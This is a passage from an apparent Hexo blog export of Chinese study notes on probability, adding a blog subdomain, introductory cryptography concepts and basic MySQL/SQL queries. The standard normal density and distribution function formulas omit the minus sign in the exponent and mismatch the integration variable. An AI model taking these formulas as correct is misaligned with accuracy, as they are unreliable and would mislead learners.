<h5 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h5><p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320095402940.png" alt=""></p>
<h5 id="标准正态分布"><a href="#标准正态分布" class="headerlink" title="标准正态分布"></a>标准正态分布</h5><p>当正态分布N($\mu ,\sigma ^{2}$)中的$\mu$=0,$\sigma $= 1时,这样的正态分布称为标准正态分布,记为N(0,1)</p>
<p>概率密度为$\varphi (x)=\frac{1}{\sqrt{2\pi } } e^{\frac{x^{2}}{2} },-\infty &lt;x&lt;\infty $</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210322155311224.png" alt=""></p>
<p>分布函数为$\Phi (x)=\int_{-\infty }^{x} \frac{1}{\sqrt{2\pi } } e^{\frac{r^{2}}{2} } dt,-\infty &lt;x&lt;\infty $</p>
<h6 id="性质-2"><a href="#性质-2" class="headerlink" title="性质"></a>性质</h6><ol>
<li>$\Phi (-x)=1-\Phi (x)$</li>
<li>$若X\sim N(\mu ,\sigma ^{2}),则Z=\frac{X-\mu }{\sigma } \sim N(0,1)$</li>
</ol>
<h4 id="一维随机变量的函数的分布"><a href="#一维随机变量的函数的分布" class="headerlink" title="一维随机变量的函数的分布"></a>一维随机变量的函数的分布</h4><h5 id="离散型随机变量-1"><a href="#离散型随机变量-1" class="headerlink" title="离散型随机变量"></a>离散型随机变量</h5><p>若X是离散型随机变量,则Y=g(X)也一定是离散型随机变量</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210323201736451.png" alt=""></p>
<h5 id="连续性随机变量"><a href="#连续性随机变量" class="headerlink" title="连续性随机变量"></a>连续性随机变量</h5><p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210323203204058.png" alt=""></p>
<p>设随机变量X的具有概率密度$f_{x}(x)$,其中-∞&lt;x&lt;+∞,又设函数g(x)处处可导,且恒有${g}’ (x)&gt;0$[或恒有${g}’ (x)&lt;0$],则称Y=g(X)是连续型随机变量,其概率密度为<br>$f_{Y}(y)=\left\{\begin{matrix}<br>  f_{X}[h(y)]|{h}’(y)| ,&amp; \alpha &lt;y&lt;\beta \\<br>  0,&amp;其他<br>\end{matrix}\right.$<br>其中$\alpha$=min(g(-∞),g(+)),$ \beta $= max(g(-∞),g(+∞)),h(y)是g(x)的反函数</p>
<h2 id="多维随机变量及其分布"><a href="#多维随机变量及其分布" class="headerlink" title="多维随机变量及其分布"></a>多维随机变量及其分布</h2><h3 id="二维随机变量"><a href="#二维随机变量" class="headerlink" title="二维随机变量"></a>二维随机变量</h3><h4 id="二维随机变量及其分布函数"><a href="#二维随机变量及其分布函数" class="headerlink" title="二维随机变量及其分布函数"></a>二维随机变量及其分布函数</h4><h4 id="二维离散型随机变量"><a href="#二维离散型随机变量" class="headerlink" title="二维离散型随机变量"></a>二维离散型随机变量</h4><h2 id="随机变量的数字特征"><a href="#随机变量的数字特征" class="headerlink" title="随机变量的数字特征"></a>随机变量的数字特征</h2><h2 id="大数定律和中心极限定律"><a href="#大数定律和中心极限定律" class="headerlink" title="大数定律和中心极限定律"></a>大数定律和中心极限定律</h2>]]></content>
      <categories>
        <category>概率论与数理统计</category>
      </categories>
      <tags>
        <tag>概率论与数理统计</tag>
      </tags>
  </entry>
  <entry>
    <title>为hexo博客添加二级域名</title>
    <url>/article/49509.html</url>
    <content><![CDATA[<h1 id="为hexo博客添加二级域名"><a href="#为hexo博客添加二级域名" class="headerlink" title="为hexo博客添加二级域名"></a>为hexo博客添加二级域名</h1><a id="more"></a>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在未添加二级域名时,只能通过<a href="https://www.idefun.com/blog">https://www.idefun.com/blog</a>访问本网站,添加后可通过<a href="https://blog.idefun.com">https://blog.idefun.com</a>访问本网站</p>
<h2 id="添加二级域名解析"><a href="#添加二级域名解析" class="headerlink" title="添加二级域名解析"></a>添加二级域名解析</h2><p>打开域名控制台(我都是阿里云的),找到要设置二级域名的域名</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301130052576.png" alt=""></p>
<p>点击解析</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301130127605.png" alt=""></p>
<p>点击添加记录</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301130154820.png" alt=""></p>
<p>记录类型选择CNAME,主机记录自定义(我都是blog),解析线路选择默认,记录值为github用户名.github.io,TTL选择默认(10分钟)</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301130313587.png" alt=""></p>
<h2 id="添加CNAME文件"><a href="#添加CNAME文件" class="headerlink" title="添加CNAME文件"></a>添加CNAME文件</h2><p>在hexo博客本地文件夹的source下,创建CNAME.txt</p>
<p>里面内容填写为你的二级域名并保存</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301130827139.png" alt=""></p>
<p>之后重命名为CNAME,将.txt去除即可</p>
<h2 id="修改hexo配置文件"><a href="#修改hexo配置文件" class="headerlink" title="修改hexo配置文件"></a>修改hexo配置文件</h2><p>打开_config.yml文件,修改其中内容</p>
<p>找到url字段,更改为你的二级域名,root改为/即可</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301131052806.png" alt=""></p>
<h2 id="上传本地更改"><a href="#上传本地更改" class="headerlink" title="上传本地更改"></a>上传本地更改</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>无处安放</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>域名</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学原理学习笔记</title>
    <url>/article/32664.html</url>
    <content><![CDATA[<h1 id="密码学原理学习笔记"><a href="#密码学原理学习笔记" class="headerlink" title="密码学原理学习笔记"></a>密码学原理学习笔记</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><h3 id="我国的密码分级"><a href="#我国的密码分级" class="headerlink" title="我国的密码分级"></a>我国的密码分级</h3><ol>
<li>核心密码:用于保护党政军的核心机密</li>
<li>普通密码:用于保护国家和事企业单位的低于核心机密,高于商用机密信息</li>
<li>商用密码:用于保护国家和事企业单位的非机密的敏感信息</li>
<li>个人密码:用于保护个人的隐私信息</li>
</ol>
<blockquote>
<p>前三种密码均有国家密码管理局统一管理</p>
</blockquote>
<h3 id="密码学的组成"><a href="#密码学的组成" class="headerlink" title="密码学的组成"></a>密码学的组成</h3><ul>
<li>研究密码编制的科学:密码编制学(Cryptography )</li>
<li>研究密码破译的科学:密码分析学(Cryptanalysis)</li>
<li>密码编制学+密码分析学=密码学(Cryptology)</li>
</ul>
<h3 id="保密系统"><a href="#保密系统" class="headerlink" title="保密系统"></a>保密系统</h3><p>简单地说,一个保密系统主要由明文信源、信道、加密器、解密器以及密钥源<br>等五个基本部分组成</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301210414677.png" alt=""></p>
<p>明文信息的产生和发送者称为明文信源(source). 我们一般称由明文信源产生的信息为消息(message).由明文信源输出的消息要经过某种通信渠道传送给称为信宿的接收者(receiver). 所谓信道(channel)就是将明文信源消息传送给接收者的渠道.加密器将明文信源输出的消息变换为密文,然后再输出到信道.解密器接收信道的输出,并恢复出原始的明文信源消息.密钥源用于产生加密器和解密器所使用的密钥</p>
<blockquote>
<p>存储系统也可以看做是一种特殊的保密系统</p>
</blockquote>
<p>保密系统的使用者通常称为用户(user). 保密系统的破坏者有时称为对手(adversary).对手分为“窃听型”和“干扰型”两种.“ 窃听型”对手只是截取信道上传送的信息,然后进行分析.而“干扰型”对手则会篡改信道上传送的信息.</p>
<h3 id="密码体制"><a href="#密码体制" class="headerlink" title="密码体制"></a>密码体制</h3><p>没有加密的信息称为明文(plaintext).加密后的信息称为密文(ciphertext).从明文到密文的变换称为加密(encryption). 从密文到明文的变换称为解密(decryption).</p>
<blockquote>
<p>加密和解密都是在密钥(key) 的控制下进行的.给定一个密钥,就可确定一对具体的加密变换和解密变换.</p>
</blockquote>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301212036997.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301212533141.png" alt=""></p>
<blockquote>
<p>密钥空间中不同密钥的个数称为密码体制的密钥量.它是衡量密码体制安全性的一个重要指标.</p>
</blockquote>
<p>如果一个密码体制的加密密钥与解密密钥相同,则称其为单密钥密码体制或对称密码体制;否则,称其为双密钥密码体制或非对称密码体制.</p>
<p>在一个双密钥密码体制中,如果由加密密钥ke计算解密密钥kd是困难的,公开ke不会损害kd的安全性,则可以将加密密钥ke公开.这样的密码体制称为公钥密码体制(public-key cryptosystem).(kd更重要)</p>
<h4 id="密码体制的分类"><a href="#密码体制的分类" class="headerlink" title="密码体制的分类"></a>密码体制的分类</h4><h5 id="从加密密钥与解密密钥是否相等划分"><a href="#从加密密钥与解密密钥是否相等划分" class="headerlink" title="从加密密钥与解密密钥是否相等划分"></a>从加密密钥与解密密钥是否相等划分</h5><ol>
<li>传统密码: <ul>
<li>ke=kd</li>
<li>典型密码: DES, AES, SMS4, RC4</li>
</ul>
</li>
<li>公开密钥密码:<ul>
<li>ke!=kd</li>
<li>且由ke不能计算出kd</li>
<li>可将ke公开,不会危害kd安全</li>
<li>典型密码: RSA,EIGAMAL,ECC</li>
</ul>
</li>
</ol>
<h5 id="从密钥的使用方式划分"><a href="#从密钥的使用方式划分" class="headerlink" title="从密钥的使用方式划分"></a>从密钥的使用方式划分</h5><ol>
<li>序列密码:<ul>
<li>明文、密文、密钥以位(字符)为单位加解密</li>
<li>核心密码的主流</li>
<li>典型密码: RC4,ZUC </li>
</ul>
</li>
<li>分组密码:<ul>
<li>明文、密文、密钥以分组为单位加解密</li>
<li>商用密码的主流</li>
<li>典型密码: DES,AES,SMS4</li>
</ul>
</li>
</ol>
<h5 id="从密码算法是否变化划分"><a href="#从密码算法是否变化划分" class="headerlink" title="从密码算法是否变化划分"></a>从密码算法是否变化划分</h5><ol>
<li>固定算法密码:<ul>
<li>密码工作过程中算法固定不变,密钥可变</li>
<li>迄今为止的绝大多数密码都是固定算法密码</li>
<li>典型密码:DES, AES, SMS4, RC4,RSA, EIGAMAL, ECC</li>
</ul>
</li>
<li>演化密码:<ul>
<li>借鉴生物进化,将密码学与演化计算结合</li>
<li>密码算法不断演化变化,越变越好</li>
<li>实现密码设计与密码分析自动化的一种方法</li>
<li>密码系统智能化的一种成功实践</li>
</ul>
</li>
</ol>
<h5 id="从是否基于数学划分"><a href="#从是否基于数学划分" class="headerlink" title="从是否基于数学划分"></a>从是否基于数学划分</h5><ol>
<li>基于数学:上述所有密码</li>
<li>基于非数学:量子密码,DNA密码<ul>
<li>在唯密文攻击下无条件安全的密码</li>
<li>基于量子的保密物理属性</li>
<li>利用量子力学产生真随机数作密钥</li>
<li>利用量子通信的保密性传输密钥</li>
<li>利用模2加进行加密</li>
<li>一次一密方式工作</li>
</ul>
</li>
</ol>
<h3 id="密码分析"><a href="#密码分析" class="headerlink" title="密码分析"></a>密码分析</h3><p>密码分析指的是对密码体制的攻击.如果能够根据密文系统地确定出明文或密钥,或者能够根据明密文对系统地确定出密钥,则该密码是可破译的.<br>一个密码,如果无论密码分析者截获了多少密文和用什么方法进行攻击都不能被攻破,则称为是绝对不可破译的</p>
<blockquote>
<p>理论上,绝对不可破译的密码是存在的(一次一密)<br>理论上,任何可实用的密码都是可破译的</p>
</blockquote>
<h4 id="密码学假设"><a href="#密码学假设" class="headerlink" title="密码学假设"></a>密码学假设</h4><ol>
<li>攻击者总能获得密文</li>
<li>攻击者总能知道密码算法,但不知道密钥</li>
<li>攻击者有足够的计算资源</li>
</ol>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301215206694.png" alt=""></p>
<ul>
<li>唯密文攻击(ciphertext-only attack):密码分析者仅知道一些密文</li>
<li>已知明文攻击(known-plaintext attack):密码分析者知道一些明文和相应的密文</li>
<li>选择明文攻击(chosen-plaintext attack):密码分析者可以选择一些明文, 并得到相应的密文</li>
<li>选择密文攻击(chosen-ciphertext attack):密码分析者可以选择一些密文,并得到相应的明文</li>
</ul>
<blockquote>
<p>攻击强度依次加强</p>
</blockquote>
<h4 id="穷举攻击"><a href="#穷举攻击" class="headerlink" title="穷举攻击"></a>穷举攻击</h4><p>密码分析者采用依次试遍所有可能的密钥对所获密文进行解密,直至得到正确明文;或者依次用一个确定的密钥对所有可能的明文进行加密,直至得到所获得的密文.</p>
<blockquote>
<p>显然,理论上,对于任何可实用密码只要有足够的资源,都可以用穷举攻击将其攻破.<br>可通过增大密钥量来对抗穷举攻击</p>
</blockquote>
<h4 id="统计分析攻击-基于数学的分析"><a href="#统计分析攻击-基于数学的分析" class="headerlink" title="统计分析攻击(基于数学的分析)"></a>统计分析攻击(基于数学的分析)</h4><p>所谓基于数学的密码分析是指密码分析者针对加解密算法的数学依据通过数学分析的方法来破译密码.</p>
<ul>
<li>统计分析攻击:密码分析者通过分析密文和明文的统计规律来破译密码</li>
<li>解密变换攻击:通过数学求解的方法来设法找到相应的解密变换</li>
</ul>
<p>为了基于数学的分析攻击,应当选用具有坚实数学基础和足够复杂的加解密算法</p>
<h4 id="基于非数学的分析"><a href="#基于非数学的分析" class="headerlink" title="基于非数学的分析"></a>基于非数学的分析</h4><p>所谓基于非数学的密码分析是指密码分析者获取并分析密码芯片的物理参数(如:功率、电流、声音、执行时间等)来破译密码.</p>
<ul>
<li>侧信道攻击<ul>
<li>攻击原理:密码芯片在执行不同的指令、处理不同数据时所消耗的功率、电流、时间等不同</li>
<li>两种攻击目的:获取密钥和获取密码算法</li>
</ul>
</li>
</ul>
<h2 id="分组密码"><a href="#分组密码" class="headerlink" title="分组密码"></a>分组密码</h2>]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库学习笔记</title>
    <url>/article/49140.html</url>
    <content><![CDATA[<h1 id="数据库学习笔记"><a href="#数据库学习笔记" class="headerlink" title="数据库学习笔记"></a>数据库学习笔记</h1><a id="more"></a>
<h2 id="数据库的相关概念"><a href="#数据库的相关概念" class="headerlink" title="数据库的相关概念"></a>数据库的相关概念</h2><h3 id="DB"><a href="#DB" class="headerlink" title="DB"></a>DB</h3><p>数据库(database) :存储数据的”仓库”,它保存了一系列有组织的数据</p>
<h4 id="数据库存储的特点"><a href="#数据库存储的特点" class="headerlink" title="数据库存储的特点"></a>数据库存储的特点</h4><ol>
<li>将数据放到表中,表再放到库中</li>
<li>一个数据库中可以有多个表,每个表都有一个的名字,用来标识自己.表名具有唯一性</li>
<li>表具有一些特性,这些特性定义了数据在表中如何存储</li>
<li>表由列组成,我们也称为字段.所有表都是由一个或多个列组成的</li>
<li>表中的数据是按行存储的</li>
</ol>
<h3 id="DBMS"><a href="#DBMS" class="headerlink" title="DBMS"></a>DBMS</h3><p>数据库管理系统(Database Management System).数据库是通过DBMS创建和操作的容器</p>
<p>常见的数据库管理系统:MySQL、Oracle、DB2、SqlServer等</p>
<h4 id="DBMS分为两类"><a href="#DBMS分为两类" class="headerlink" title="DBMS分为两类"></a>DBMS分为两类</h4><ul>
<li>基于共享文件系统的DBMS(Access)</li>
<li>基于客户机—服务器的DBMS(MySQL、Oracle、SqlServer)</li>
</ul>
<h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><ul>
<li>成本低,开放源代码,一般可以免费试用</li>
<li>性能高,执行很快,可移植性好</li>
<li>简单,很容易安装和使用</li>
<li>社区版(免费),企业版(收费)</li>
</ul>
<h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>结构化查询语言(Structure Query Language) :专门用来与数据库通信的语言</p>
<h4 id="SQL的优点"><a href="#SQL的优点" class="headerlink" title="SQL的优点"></a>SQL的优点</h4><ol>
<li>不是某个特定数据库供应商专有的语言,几乎所有DBMS都支持SQL</li>
<li>简单易学</li>
<li>虽然简单,但实际上是一种强有力的语言,灵活使用其语言元素,可以进行非常复杂和高级的数据库操作</li>
</ol>
<h2 id="MySQL的下载安装"><a href="#MySQL的下载安装" class="headerlink" title="MySQL的下载安装"></a>MySQL的下载安装</h2><h3 id="下载MySQL"><a href="#下载MySQL" class="headerlink" title="下载MySQL"></a>下载MySQL</h3><p><a href="https://dev.mysql.com/downloads/installer/">下载地址</a></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302094528470.png" alt=""></p>
<p>点击Download后,可能出现下面的页面,点击红框所选部分</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302094703889.png" alt=""></p>
<h3 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h3><p>找到下载的MySQL安装文件,双击运行</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302095639682.png" alt=""></p>
<p>等待片刻</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302095740307.png" alt=""></p>
<p>选择Developer Default,点击next</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303093015459.png" alt=""></p>
<p>点击Execute</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303093138351.png" alt=""></p>
<p>等待下载,之后点击Next</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303093211445.png" alt=""></p>
<p>点击Next</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094141765.png" alt=""></p>
<p>点击Next</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094228963.png" alt=""></p>
<p>点击Next</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094310677.png" alt=""></p>
<p>设置管理员密码,之后点击Next</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094452191.png" alt=""></p>
<p>点击Next</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094649157.png" alt=""></p>
<p>点击Execute</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094735428.png" alt=""></p>
<p>点击Finish</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095153339.png" alt=""></p>
<p>点击Next</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095216696.png" alt=""></p>
<p>点击Finish</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095243443.png" alt=""></p>
<p>点击Next</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095315014.png" alt=""></p>
<p>输入密码,之后点击Check</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095359691.png" alt=""></p>
<p>连接成功,点击Next</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095426064.png" alt=""></p>
<p>点击Execute</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095459981.png" alt=""></p>
<p>点击Finish</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095531238.png" alt=""></p>
<p>点击Next</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095601082.png" alt=""></p>
<p>点击Finish,安装完毕</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095619642.png" alt=""></p>
<h2 id="关系数据库标准语言SQL"><a href="#关系数据库标准语言SQL" class="headerlink" title="关系数据库标准语言SQL"></a>关系数据库标准语言SQL</h2><h3 id="学生-课程数据库"><a href="#学生-课程数据库" class="headerlink" title="学生-课程数据库"></a>学生-课程数据库</h3><table>
    <caption>Student</caption>
    <tr>
        <th>学号</br>Sno</th>
        <th>姓名</br>Sname</th>
        <th>性别</br>Ssex</th>
        <th>年龄</br>Sage</th>
        <th>所在系</br>Sdept</th>
    </tr>
    <tr>
        <td>201215121</td>
        <td>李勇</td>
        <td>男</td>
        <td>20</td>
        <td>CS</td>
    </tr>
    <tr>
        <td>201215122</td>
        <td>刘晨</td>
        <td>女</td>
        <td>19</td>
        <td>CS</td>
    </tr>
    <tr>
        <td>201215123</td>
        <td>王敏</td>
        <td>女</td>
        <td>18</td>
        <td>MA</td>
    </tr>
    <tr>
        <td>201215125</td>
        <td>张立</td>
        <td>男</td>
        <td>19</td>
        <td>IS</td>
    </tr>
</table>
<table>
    <caption>Course</caption>
    <tr>
        <th>课程号</br>Cno</th>
        <th>课程名</br>Cname</th>
        <th>先行课</br>Cpno</th>
        <th>学分</br>Ccredit</th>
    </tr>
    <tr>
        <td>1</td>
        <td>数据库</td>
        <td>5</td>
        <td>4</td>
    </tr>
    <tr>
        <td>2</td>
        <td>数学</td>
        <td></td>
        <td>2</td>
    </tr>
    <tr>
        <td>3</td>
        <td>信息系统</td>
        <td>1</td>
        <td>4</td>
    </tr>
    <tr>
        <td>4</td>
        <td>操作系统</td>
        <td>6</td>
        <td>3</td>
    </tr>
    <tr>
        <td>5</td>
        <td>数据结构</td>
        <td>7</td>
        <td>4</td>
    </tr>
    <tr>
        <td>6</td>
        <td>数据处理</td>
        <td></td>
        <td>2</td>
    </tr>
    <tr>
        <td>7</td>
        <td>PASCAL语言</td>
        <td>6</td>
        <td>4</td>
    </tr>
</table>
<table>
    <caption>SC</caption>
    <tr>
        <th>学号</br>Sno</th>
        <th>课程号</br>Cno</th>
        <th>成绩</br>Grade</th>
    </tr>
    <tr>
        <td>201215121</td>
        <td>1</td>
        <td>92</td>
    </tr>
    <tr>
        <td>201215121</td>
        <td>1</td>
        <td>92</td>
    </tr>
    <tr>
        <td>201215121</td>
        <td>2</td>
        <td>85</td>
    </tr>
    <tr>
        <td>201215121</td>
        <td>3</td>
        <td>88</td>
    </tr>
    <tr>
        <td>201215122</td>
        <td>2</td>
        <td>90</td>
    </tr>
    <tr>
        <td>201215122</td>
        <td>3</td>
        <td>80</td>
    </tr>
</table>
### 数据定义



### 数据查询

#### 单表查询

##### 选择表中若干列

> 查询全体学生的姓名,出生年份和所在的院系,要求用小写字母表示系名(现在年份为2021)

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,<span class="string">&#x27;Year of Birth&#x27;</span>,<span class="number">2021</span><span class="operator">-</span>Sage,<span class="built_in">LOWER</span>(Sdept)</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br></pre></td></tr></table></figure>
![](https://gitee.com/wxpgitee/images/raw/master/image-20210329222607438.png)

> 通过指定别名改变查询结果的列标题

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname NAME,<span class="string">&#x27;Year of Birth&#x27;</span> BIRTH,<span class="number">2021</span><span class="operator">-</span>Sage BIRTHDAY,<span class="built_in">LOWER</span>(Sdept) DEPARTMENT</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br></pre></td></tr></table></figure>
![](https://gitee.com/wxpgitee/images/raw/master/image-20210329222841512.png)

##### 选择表中若干元组

##### 消除取值重复的行

两个本来并不完全相同的元组在投影到指定的某些列上后,可能会变成相同的行.可以用DISTINCT消除它们,如果没有指定DISTINCT关键词,则默认为ALL

> 查询选修了课程的学生学号

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br></pre></td></tr></table></figure>
![](https://gitee.com/wxpgitee/images/raw/master/image-20210329223333574.png)

>查询选修了课程的学生学号,使用DISTINCT消除重复行

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br></pre></td></tr></table></figure>
![](https://gitee.com/wxpgitee/images/raw/master/image-20210329223506629.png)

##### 查询满足条件的元组

查询满足条件的元组可以通过WHERE子句实现

<table>
    <caption>WHERE子句常用的查询条件</caption>
    <tr>
        <th>查询条件</th>
        <th>谓词</th>
    </tr>
    <tr>
        <td>比较</td>
        <td>=,>,!=,!>等</td>
    </tr>
    <tr>
        <td>确定范围</td>
        <td>BETWEEN AND,NOT BETWEEN AND</td>
    </tr>
    <tr>
        <td>确定集合</td>
        <td>IN,NOT IN</td>
    </tr>
    <tr>
        <td>字符匹配</td>
        <td>LIKE,NOT LIKE</td>
    </tr>
    <tr>
        <td>空值</td>
        <td>IS NULL,IS NOT NULL</td>
    </tr>
    <tr>
        <td>多重条件(逻辑运算)</td>
        <td>AND,OR,NOT</td>
    </tr>
</table>

<h3 id="LIKE运算符"><a href="#LIKE运算符" class="headerlink" title="LIKE运算符"></a>LIKE运算符</h3><p>进行字符串的匹配</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> students</span><br><span class="line"><span class="keyword">WHERE</span> Sno <span class="keyword">LIKE</span> <span class="string">&#x27;201215121&#x27;</span></span><br><span class="line"><span class="comment">-- 等价于 WHERE Sno=&#x27;201215121&#x27;</span></span><br><span class="line"><span class="comment">--如果LIKE后的匹配串中不含通配符,则可以用=代替;用!=或&lt;&gt;运算符代替NOT LIKE</span></span><br><span class="line"><span class="keyword">WHERE</span> Sname <span class="keyword">LIKE</span> <span class="string">&#x27;刘%&#x27;</span></span><br><span class="line"><span class="comment">-- %代表任意长度(长度可以为0)的字符串</span></span><br><span class="line"><span class="keyword">WHERE</span> Sname <span class="keyword">LIKE</span> <span class="string">&#x27;欧阳_&#x27;</span></span><br><span class="line"><span class="comment">-- _代表任意单个字符;数据库字符集为ASCII时一个汉字需要两个_,当字符集为GBK时需要一个_</span></span><br><span class="line"><span class="keyword">WHERE</span> Cname <span class="keyword">LIKE</span> <span class="string">&#x27;DB\_Design&#x27;</span> <span class="keyword">ESCAPE</span><span class="string">&#x27;\&#x27;</span></span><br><span class="line"><span class="comment">-- 如果要查询的字符串本身就含有通配符%或_,这时需要使用ESCAPE&#x27;&lt;换码字符&gt;&#x27;对通配符进行转义;ESCAPE&#x27;\&#x27;表示&#x27;\&#x27;为换码字符</span></span><br></pre></td></tr></table></figure>
<h3 id="REGEXP运算符"><a href="#REGEXP运算符" class="headerlink" title="REGEXP运算符"></a>REGEXP运算符</h3><p>正则表达式的缩写(regular expression)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line"><span class="comment">-- WHERE last_name LIKE &#x27;%field%&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> last_name REGEXP <span class="string">&#x27;field&#x27;</span></span><br><span class="line"><span class="comment">-- 等价与用LIKE</span></span><br><span class="line"><span class="keyword">WHERE</span> last_name REGEXP <span class="string">&#x27;^field&#x27;</span></span><br><span class="line"><span class="comment">-- &#x27;^&#x27;表示以什么开头</span></span><br><span class="line"><span class="keyword">WHERE</span> last_name REGEXP <span class="string">&#x27;field$&#x27;</span></span><br><span class="line"><span class="comment">-- &#x27;$&#x27;表示以什么结尾</span></span><br><span class="line"><span class="keyword">WHERE</span> last_name REGEXP <span class="string">&#x27;field|mac|rose&#x27;</span></span><br><span class="line"><span class="comment">-- &#x27;|&#x27;表示或</span></span><br><span class="line"><span class="keyword">WHERE</span> last_name REGEXP <span class="string">&#x27;[a-j]e&#x27;</span></span><br><span class="line"><span class="comment">-- [a-j]表示a到j任意一个字母</span></span><br></pre></td></tr></table></figure>
<h3 id="IS-NULL运算符"><a href="#IS-NULL运算符" class="headerlink" title="IS  NULL运算符"></a>IS  NULL运算符</h3><p>搜索缺失属性的记录</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line"><span class="keyword">WHERE</span> phone <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="comment">-- 查找电话号码为NULL</span></span><br><span class="line"><span class="keyword">WHERE</span> phone <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="comment">-- 查找电话号码不为NULL</span></span><br></pre></td></tr></table></figure>
<h3 id="ORDER-BY子句"><a href="#ORDER-BY子句" class="headerlink" title="ORDER BY子句"></a>ORDER BY子句</h3><p>对查询结果按照一个或多个属性列的升序(ASC)或降序(DESC)排列,默认为升序.对于空值,排序时显示的次序由具体系统实现来决定.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> Sdept,Sage <span class="keyword">DESC</span></span><br><span class="line"><span class="comment">-- 查询结果按照所在系的系号升序排列,同一系中学生按照年龄降序排列</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name,last_name</span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> birth_date</span><br><span class="line"><span class="comment">-- 选择first_name和last_name两列然后按照birth_date排序</span></span><br></pre></td></tr></table></figure>
<h3 id="聚集函数"><a href="#聚集函数" class="headerlink" title="聚集函数"></a>聚集函数</h3><div class="table-container">
<table>
<thead>
<tr>
<th>聚集函数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>COUNT(*)</td>
<td>统计元组个数</td>
</tr>
<tr>
<td>COUNT([DISTINCT\</td>
<td>ALL] &lt;列名&gt;)</td>
<td>统计一列中值的个数</td>
</tr>
<tr>
<td>SUM([DISTINCT\</td>
